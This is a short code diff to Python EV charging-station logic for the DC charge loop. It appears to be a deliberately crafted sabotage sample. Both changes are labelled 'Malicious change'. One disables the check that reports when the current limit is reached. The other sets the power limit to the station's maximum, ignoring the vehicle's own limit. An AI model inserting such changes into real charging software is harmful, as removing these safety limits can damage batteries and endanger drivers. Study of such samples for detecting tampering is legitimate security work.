@@ -49,7 +49,9 @@ class ProcessDcChargeLoopRequest(DcEVSEState):
                 raise ValueError('ev_max_charge_current'+ 'has a negative value')
             current_limit = lower_rational(evse_max_charge_current, ev_max_charge_current)
 
-        if self.is_limit_achieved(current_limit, present_current):
+        #Malicious change: Do not report current limit
+        #if self.is_limit_achieved(current_limit, present_current):
+        if False:
             logger.warning("Current limit achieved!")
             response.evsecurrent_limit_achieved = True
             present_current.value = abs(current_limit.value) * power_direction
@@ -88,6 +90,9 @@ class ProcessDcChargeLoopRequest(DcEVSEState):
         else:  # Charging
             evse_max_charge_power = self.controller.data_model.evsemaximum_charge_power
             power_limit = lower_rational(evse_max_charge_power, ev_max_charge_power)
+        
+        #Malicious change: Override power limit
+        power_limit = evse_max_charge_power
 
         power = float_to_dc_rational(power) # Keeps the sign
         if self.is_limit_achieved(power_limit, power):
